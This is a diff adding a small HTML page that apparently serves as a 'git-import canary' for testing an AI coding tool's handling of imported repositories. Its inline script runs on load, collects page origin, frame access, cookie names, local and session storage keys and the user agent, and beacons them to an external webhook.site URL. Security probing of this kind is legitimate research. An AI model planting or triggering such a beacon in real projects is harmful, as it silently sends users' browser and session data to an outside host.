@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CANARY-NOT-FIRED</title>
+<body style="font:16px monospace;padding:2rem">trae git-import canary — dontsaynetwork</body>
+<script>
+(function () {
+  var probe = {};
+  probe.origin = location.origin;
+  probe.href = location.href.slice(0, 300);
+  probe.host = location.host;
+  probe.scheme = location.protocol;
+  probe.title0 = document.title;
+  try { probe.topOrigin = window.top.location.origin; } catch (e) { probe.topOrigin = 'BLOCKED:' + e.name; }
+  try { probe.parentHref = window.parent.location.href.slice(0, 200); } catch (e) { probe.parentHref = 'BLOCKED:' + e.name; }
+  try { probe.parentDocReadable = !!window.parent.document; } catch (e) { probe.parentDocReadable = 'BLOCKED:' + e.name; }
+  probe.isTop = (window.top === window);
+  probe.cookieLen = (document.cookie || '').length;
+  probe.cookieNames = (document.cookie || '').split(';').map(function (c) { return c.split('=')[0].trim(); }).filter(Boolean).join(',');
+  try { probe.lsKeys = Object.keys(localStorage).join(',').slice(0, 300); } catch (e) { probe.lsKeys = 'ERR'; }
+  try { probe.ssKeys = Object.keys(sessionStorage).join(',').slice(0, 300); } catch (e) { probe.ssKeys = 'ERR'; }
+  probe.ua = navigator.userAgent.slice(0, 120);
+
+  document.title = 'CANARY-FIRED@' + location.origin;
+
+  var b = new Image();
+  b.src = 'https://webhook.site/63d8e760-1cc5-44e6-a5b0-5b7a36ceee19/git-canary?d=' +
+          encodeURIComponent(JSON.stringify(probe));
+})();
+</script>
